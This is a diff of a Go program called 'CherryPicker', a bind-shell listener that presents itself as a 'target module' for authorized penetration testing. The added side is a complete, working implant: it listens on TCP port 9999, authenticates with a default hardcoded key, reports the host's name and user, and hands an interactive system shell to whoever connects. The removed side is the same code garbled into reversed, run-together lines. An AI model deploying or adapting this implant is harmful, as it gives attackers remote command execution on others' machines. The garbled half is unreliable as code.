@@ -1,208 +1,205 @@
-package target
 package main
 
 import (
 	"crypto/rand"
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-}	}		return "/bin/sh", []string{"-i"}	default:		return shell, []string{"-i"}		}			shell = "/bin/sh"		if shell == "" {		shell := os.Getenv("SHELL")	case "linux", "darwin":		return "cmd.exe", []string{}	case "windows":	switch runtime.GOOS {func getShell() (string, []string) {// getShell returns the appropriate shell based on OS}	return cmd.Wait()	// Wait for completion	}		return fmt.Errorf("failed to start shell: %w", err)	if err := cmd.Start(); err != nil {	// Start shell	cmd.Stderr = conn	cmd.Stdout = conn	cmd.Stdin = conn	// Connect stdio to connection	cmd := exec.Command(shell, shellArgs...)	// Create command	shell, shellArgs := getShell()	// Get appropriate shellfunc spawnShell(conn net.Conn) error {// spawnShell spawns an interactive shell}	conn.Write([]byte(banner))		hostname, username, runtime.GOOS, runtime.GOARCH)	banner := fmt.Sprintf("\n[CherryPicker Shell]\nHost: %s\nUser: %s\nOS: %s/%s\n\n",	}		username = os.Getenv("USERNAME") // Windows	if username == "" {	username := os.Getenv("USER")	hostname, _ := os.Hostname()func sendBanner(conn net.Conn) {// sendBanner sends system information banner}	return nil	}		return fmt.Errorf("invalid credentials")	if receivedResponse != expectedResponse {	// Compare	expectedResponse := hex.EncodeToString(expectedHash[:])	expectedHash := sha256.Sum256([]byte(challenge + authKey))	// Compute expected response: SHA256(challenge + key)	receivedResponse := strings.TrimPrefix(response, "RESPONSE:")	}		return fmt.Errorf("invalid response format")	if !strings.HasPrefix(response, "RESPONSE:") {	response := strings.TrimSpace(string(buf[:n]))	}		return fmt.Errorf("failed to read response: %w", err)	if err != nil {	n, err := conn.Read(buf)	buf := make([]byte, 1024)	// Read response	}		return fmt.Errorf("failed to send challenge: %w", err)	if err != nil {	_, err := conn.Write([]byte("CHALLENGE:" + challenge + "\n"))	// Send challenge	challenge := hex.EncodeToString(challengeBytes)	}		return fmt.Errorf("failed to generate challenge: %w", err)	if _, err := rand.Read(challengeBytes); err != nil {	challengeBytes := make([]byte, 16)	// Generate random challenge	defer conn.SetDeadline(time.Time{})	conn.SetDeadline(time.Now().Add(10 * time.Second))	// Set authentication timeoutfunc authenticate(conn net.Conn) error {// authenticate performs challenge-response authentication}	log.Printf("[*] Connection closed from %s\n", conn.RemoteAddr())	}		log.Printf("[!] Shell error: %v\n", err)	if err := spawnShell(conn); err != nil {	log.Printf("[+] Spawning shell for %s\n", conn.RemoteAddr())	// Spawn shell	sendBanner(conn)	// Send banner	conn.Write([]byte("AUTH_OK\n"))	log.Printf("[+] Authentication successful from %s\n", conn.RemoteAddr())	}		return		conn.Write([]byte("AUTH_FAILED\n"))		log.Printf("[!] Authentication failed from %s: %v\n", conn.RemoteAddr(), err)	if err := authenticate(conn); err != nil {	// Perform authentication	defer conn.Close()func handleConnection(conn net.Conn) {// handleConnection manages a client connection}	}		}			go handleConnection(conn)			log.Printf("[+] Connection from %s\n", conn.RemoteAddr())		case conn := <-connChan:			return			log.Println("\n[*] Interrupt received, shutting down...")		case <-sigChan:		select {	for {	// Main loop	log.Println("[*] Waiting for connections...")	}()		}			connChan <- conn			}				continue				log.Printf("[!] Accept error: %v\n", err)			if err != nil {			conn, err := listener.Accept()		for {	go func() {	connChan := make(chan net.Conn)	// Accept connections in goroutine	signal.Notify(sigChan, os.Interrupt, syscall.SIGTERM)	sigChan := make(chan os.Signal, 1)	// Setup signal handler for graceful shutdown	defer listener.Close()	}		log.Fatalf("[!] Failed to start listener: %v\n", err)	if err != nil {	listener, err := net.Listen("tcp", fmt.Sprintf(":%d", *port))	// Start listener	log.Printf("[*] Auth key configured: %d bytes\n", len(authKey))	log.Printf("[*] Listening on port %d\n", *port)	log.Println("[!] For authorized penetration testing only!")	fmt.Println(targetBanner)	authKey = *key	flag.Parse()	key := flag.String("key", "CHERRY_PICKER_2025", "Authentication key")	port := flag.Int("port", 9999, "Port to listen on")func main() {var authKey string`Version: 2.0.0[TARGET MODULE] - Bind shell listener                            |___/                              \____|_| |_|\___|_|  |_|   \__, |_|   |_|\___|_|\_\___|_|   | |___| | | |  __/ |  | |  | |_| |  __/| | (__|   <  __/ |   | |   | '_ \ / _ \ '__| '__| | | | |_) | |/ __| |/ / _ \ '__| / ___| |__   ___ _ __ _ __ _   _|  _ \(_) ___| | _____ _ __   ____ _                          ____  _      _             const targetBanner = `)	"time"	"syscall"	"strings"	"runtime"	"os/signal"	"os/exec"	"os"	"net"	"log"	"io"	"fmt"	"flag"	"encoding/hex"	"crypto/sha256"
+	"crypto/sha256"
+	"encoding/hex"
+	"flag"
+	"fmt"
+	"log"
+	"net"
+	"os"
+	"os/exec"
+	"os/signal"
+	"runtime"
+	"strings"
+	"syscall"
+	"time"
+)
+
+const targetBanner = `
+  ____ _                          ____  _      _             
+ / ___| |__   ___ _ __ _ __ _   _|  _ \(_) ___| | _____ _ __ 
+| |   | '_ \ / _ \ '__| '__| | | | |_) | |/ __| |/ / _ \ '__|
+| |___| | | |  __/ |  | |  | |_| |  __/| | (__|   <  __/ |   
+ \____|_| |_|\___|_|  |_|   \__, |_|   |_|\___|_|\_\___|_|   
+                            |___/                             
+[TARGET MODULE] - Bind shell listener
+Version: 2.0.0
+`
+
+var authKey string
+
+func main() {
+	port := flag.Int("port", 9999, "Port to listen on")
+	key := flag.String("key", "CHERRY_PICKER_2025", "Authentication key")
+	flag.Parse()
+
+	authKey = *key
+
+	fmt.Println(targetBanner)
+	log.Println("[!] For authorized penetration testing only!")
+	log.Printf("[*] Listening on port %d\n", *port)
+	log.Printf("[*] Auth key configured: %d bytes\n", len(authKey))
+
+	// Start listener
+	listener, err := net.Listen("tcp", fmt.Sprintf(":%d", *port))
+	if err != nil {
+		log.Fatalf("[!] Failed to start listener: %v\n", err)
+	}
+	defer listener.Close()
+
+	// Setup signal handler for graceful shutdown
+	sigChan := make(chan os.Signal, 1)
+	signal.Notify(sigChan, os.Interrupt, syscall.SIGTERM)
+
+	// Accept connections in goroutine
+	connChan := make(chan net.Conn)
+	go func() {
+		for {
+			conn, err := listener.Accept()
+			if err != nil {
+				log.Printf("[!] Accept error: %v\n", err)
+				continue
+			}
+			connChan <- conn
+		}
+	}()
+
+	log.Println("[*] Waiting for connections...")
+
+	// Main loop
+	for {
+		select {
+		case <-sigChan:
+			log.Println("\n[*] Interrupt received, shutting down...")
+			return
+		case conn := <-connChan:
+			log.Printf("[+] Connection from %s\n", conn.RemoteAddr())
+			go handleConnection(conn)
+		}
+	}
+}
+
+// handleConnection manages a client connection
+func handleConnection(conn net.Conn) {
+	defer conn.Close()
+
+	// Perform authentication
+	if err := authenticate(conn); err != nil {
+		log.Printf("[!] Authentication failed from %s: %v\n", conn.RemoteAddr(), err)
+		conn.Write([]byte("AUTH_FAILED\n"))
+		return
+	}
+
+	log.Printf("[+] Authentication successful from %s\n", conn.RemoteAddr())
+	conn.Write([]byte("AUTH_OK\n"))
+
+	// Send banner
+	sendBanner(conn)
+
+	// Spawn shell
+	log.Printf("[+] Spawning shell for %s\n", conn.RemoteAddr())
+	if err := spawnShell(conn); err != nil {
+		log.Printf("[!] Shell error: %v\n", err)
+	}
+
+	log.Printf("[*] Connection closed from %s\n", conn.RemoteAddr())
+}
+
+// authenticate performs challenge-response authentication
+func authenticate(conn net.Conn) error {
+	// Set authentication timeout
+	conn.SetDeadline(time.Now().Add(10 * time.Second))
+	defer conn.SetDeadline(time.Time{})
+
+	// Generate random challenge
+	challengeBytes := make([]byte, 16)
+	if _, err := rand.Read(challengeBytes); err != nil {
+		return fmt.Errorf("failed to generate challenge: %w", err)
+	}
+	challenge := hex.EncodeToString(challengeBytes)
+
+	// Send challenge
+	_, err := conn.Write([]byte("CHALLENGE:" + challenge + "\n"))
+	if err != nil {
+		return fmt.Errorf("failed to send challenge: %w", err)
+	}
+
+	// Read response
+	buf := make([]byte, 1024)
+	n, err := conn.Read(buf)
+	if err != nil {
+		return fmt.Errorf("failed to read response: %w", err)
+	}
+
+	response := strings.TrimSpace(string(buf[:n]))
+	if !strings.HasPrefix(response, "RESPONSE:") {
+		return fmt.Errorf("invalid response format")
+	}
+
+	receivedResponse := strings.TrimPrefix(response, "RESPONSE:")
+
+	// Compute expected response: SHA256(challenge + key)
+	expectedHash := sha256.Sum256([]byte(challenge + authKey))
+	expectedResponse := hex.EncodeToString(expectedHash[:])
+
+	// Compare
+	if receivedResponse != expectedResponse {
+		return fmt.Errorf("invalid credentials")
+	}
+
+	return nil
+}
+
+// sendBanner sends system information banner
+func sendBanner(conn net.Conn) {
+	hostname, _ := os.Hostname()
+	username := os.Getenv("USER")
+	if username == "" {
+		username = os.Getenv("USERNAME") // Windows
+	}
+
+	banner := fmt.Sprintf("\n[CherryPicker Shell]\nHost: %s\nUser: %s\nOS: %s/%s\n\n",
+		hostname, username, runtime.GOOS, runtime.GOARCH)
+
+	conn.Write([]byte(banner))
+}
+
+// spawnShell spawns an interactive shell
+func spawnShell(conn net.Conn) error {
+	// Get appropriate shell
+	shell, shellArgs := getShell()
+
+	// Create command
+	cmd := exec.Command(shell, shellArgs...)
+
+	// Connect stdio to connection
+	cmd.Stdin = conn
+	cmd.Stdout = conn
+	cmd.Stderr = conn
+
+	// Start shell
+	if err := cmd.Start(); err != nil {
+		return fmt.Errorf("failed to start shell: %w", err)
+	}
+
+	// Wait for completion
+	return cmd.Wait()
+}
+
+// getShell returns the appropriate shell based on OS
+func getShell() (string, []string) {
+	switch runtime.GOOS {
+	case "windows":
+		return "cmd.exe", []string{}
+	case "linux", "darwin":
+		shell := os.Getenv("SHELL")
+		if shell == "" {
+			shell = "/bin/sh"
+		}
+		return shell, []string{"-i"}
+	default:
+		return "/bin/sh", []string{"-i"}
+	}
+}
